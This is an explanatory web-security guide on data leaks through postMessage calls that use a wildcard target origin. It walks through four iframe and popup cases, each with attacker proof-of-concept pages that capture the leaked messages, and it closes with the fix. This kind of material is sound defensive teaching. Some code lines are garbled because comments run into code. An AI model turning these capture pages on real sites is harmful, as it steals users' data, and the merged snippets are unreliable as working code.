When a website uses a wildcard (*) in postMessage, it broadcasts sensitive data to whichever window occupies the other side of the browser context channel. Because JavaScript handles different window relationships distinct ways, attackers use specific setups depending on how the victim page is designed.
Here are all the primary structural cases of postMessage information disclosure based on how the victim page targets its recipient.
------------------------------
## Case 1: The Child-to-Parent Frame (Your Initial Setup)
This happens when a website is designed to run inside an <iframe> and sends data back to the webpage hosting it.

* Victim Implementation:
```
// Runs inside the iframe
window.parent.postMessage(payload, "*");
```
* Attacker Exploitation Setup:
The attacker hosts a malicious page and embeds the victim site directly inside an iframe.
```
<!-- Attacker Page -->
<iframe src="https://victim-site.com"></iframe>
<script>
  window.addEventListener("message", (event) => {
      console.log("Stolen Frame Data:", event.data);
  });
</script>
```
* Mitigation Effectiveness: A Content Security Policy (CSP) with frame-ancestors 'self' or frame-ancestors 'none' completely blocks this case because the browser refuses to render the victim page inside the attacker's iframe.

------------------------------
## Case 2: The Popup-to-Opener Window (The CSP Bypass)
This happens when the victim site opens or gets opened as a separate tab/popup and attempts to communicate back to the window that launched it.

* Victim Implementation:
```
// Runs inside the popup tabif (window.opener) {
    window.opener.postMessage(payload, "*");
}
```
* Attacker Exploitation Setup:
The attacker cannot use an iframe due to CSP, so they trick the user into clicking a link or button that opens the victim site in a new tab.
```
<!-- Attacker Page -->
<button onclick="launch()">Open App</button>
<script>
  function launch() {
      window.open("https://victim-site.com", "_blank");
  }
  window.addEventListener("message", (event) => {
      console.log("Stolen Popup Data:", event.data);
  });
</script>
```
* Mitigation Effectiveness: CSP frame-ancestors offers zero protection here because no iframes are used. The attack succeeds completely unless the target origin is specified instead of *.

------------------------------
## Case 3: The Parent-to-Child Frame (Downstream Leak)
This happens when a main website creates an iframe pointing to a third-party service or application and pushes data down into it.

* Victim Implementation:
```
// Runs on the main dashboard siteconst childFrame = document.getElementById("app-frame");
childFrame.contentWindow.postMessage(payload, "*");
```
* Attacker Exploitation Setup:
If an attacker can find a way to manipulate the source URL of that iframe (via an open redirect, a broken cross-domain configuration, or a Prototype Pollution vulnerability), they can swap the frame target to their own malicious site.
```
<!-- Victim's setup hijacked by attacker via URL manipulation -->
<iframe id="app-frame" src="https://attacker-controlled-site.com"></iframe>

Inside capture.html, the attacker simply listens:

// Attacker Capture Page
window.addEventListener("message", (event) => {
    console.log("Stolen Downstream Data:", event.data);
});
```
* Mitigation Effectiveness: CSP headers on the parent page do not inherently prevent contentWindow from pushing data downstream if the iframe element's src points to an external site.

------------------------------
## Case 4: The Opener-to-Popup Window (Reversed Tabnabbing)
This happens when a main website opens a secondary window (like a chat widget or payment gateway) and pushes configuration or user data forward into the newly opened tab.

* Victim Implementation:
```
// Runs on the main siteconst popup = window.open("https://victim-widgets.com", "_blank");// ... wait for load ...
popup.postMessage(payload, "*");
```
* Attacker Exploitation Setup:
If the target application can be framed or if the initial window reference can be intercepted via a malicious site intermediate, the attacker opens the victim's launching page. If the launching page does not explicitly enforce a target origin on the popup handle, the data broadcasts into whatever is running in that active tab reference.More critically, if the target site (chat.html in this example) is vulnerable to Cross-Site Scripting (XSS) or an open redirect, an attacker can hijack the reference of the window being opened, forcing window.open to point to a malicious endpoint that receives the wildcard transmission.

------------------------------
## 🛡️ How to Fix Every Case Permanently
The ultimate fix for all four structural variations requires eliminating the wildcard * symbol entirely. You must specify an exact, hardcoded, or dynamically verified target origin.
Instead of this:
```
targetWindow.postMessage(payload, "*");
```
Do this:
```
// Replace with the exact protocol, domain, and port allowed to read the dataconst trustedOrigin = "https://yourdomain.com"; 
targetWindow.postMessage(payload, trustedOrigin);
```
